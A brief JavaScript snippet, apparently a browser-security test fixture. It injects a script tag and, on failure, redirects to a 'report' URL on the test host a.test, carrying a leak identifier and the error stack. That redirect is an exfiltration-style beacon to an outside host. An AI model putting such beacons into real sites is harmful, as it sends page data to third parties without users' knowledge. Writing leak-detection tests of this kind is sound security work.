try {
  var script = document.createElement('script');
  script.src = 'redirect';
  document.head.appendChild(script);
} catch (error) {
  document.location.href = "https://a.test/report/?leak=c1074317&error=" + encodeURIComponent(error.stack);
}
